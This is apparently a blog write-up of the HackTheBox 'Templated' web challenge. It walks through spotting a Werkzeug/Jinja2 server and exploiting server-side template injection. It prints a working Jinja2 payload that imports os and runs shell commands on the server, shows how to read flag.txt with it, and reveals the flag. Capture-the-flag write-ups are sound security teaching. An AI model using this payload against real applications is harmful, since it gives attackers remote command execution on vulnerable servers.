---
title: <img width="50" alt="templated" height="50" alt="front-page port 80-shoopyu" src="https://user-images.githubusercontent.com/95465072/209340214-c49c6c63-9e67-4c8c-8165-54e8db4dd0bd.png"> Templated  | HackTheBox | web challenge
date: 2022-12-21 00:00:02 +730
categories: [Write Up, HackTheBox , Challenges]
tags: [ web, http, hackthebox, ctf, easy, walkthrough, challenge,server side template injection ] # TAG names should always be lowercase


---

-------------------

# HackTheBox Templated Walkthrough
![challenge-5](https://user-images.githubusercontent.com/95465072/208750411-4b66c958-36a6-44cc-a6ac-e7fd22ee313c.png)

Templated challenge on the hackthebox is truly a very short fun with ```Server Side Template Injection(SSTI)``` Let's dive into it!
## First Look of the site 
<img width="384" alt="front-first-80" src="https://user-images.githubusercontent.com/95465072/208750464-7938abb3-9607-4e85-ba78-7ee49bb647f3.png">

## Analysis 
I tried to look at the source code by inspecting elements but there is nothing interesting in the HTML source code that provided any hint. Neither were any cookies given by the website. Therefore, I decided to take a look at the **HTTP response header** in the Network Tab of the browser and noticed something interesting. The website uses **Werkzeug**

<img width="415" alt="serverinfo 2nd image" src="https://user-images.githubusercontent.com/95465072/208750487-b3f56baa-e5cc-4e68-81d6-66c0c395a3c2.png">

## Bit close look
notice that the website return us the exact text of what page or folder we searched. This relates to a common vulnerability on Jinja2 which is called Server-Side Template Injection (SSTI) which is just nice to the hint shown on the 1st page in Fig 3 as well as the challenge’s name which is Templated. 

<img width="473" alt="3rd-something" src="https://user-images.githubusercontent.com/95465072/208750523-c6bbd8a7-f16a-4af4-afd6-933d57a209f0.png">

## Server side template injection
&nbsp;
```
<h1>Welcome to the page!</h1>
<u>This page {{page_searched}} is not available</u>
```

## Time to Exploit!

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

The result shows that we can access the os library and execute the **id** command.

<img width="510" alt="4th-ssti" src="https://user-images.githubusercontent.com/95465072/208750595-be050833-8231-4b7c-b348-a45971816f16.png">

### Since we can run any command, we can now see the flag.txt. Indeed, the cat command shows flag.txt.
&nbsp;
>**note:-** Replace the id with cat flag.txt in the above payload

&nbsp;
# HTB{Y0u_D1d_it}!!

<img width="688" alt="this" src="https://user-images.githubusercontent.com/95465072/208751136-8714434f-97c9-4c93-b5ff-273d83e09d68.png">

## Congragulations!!
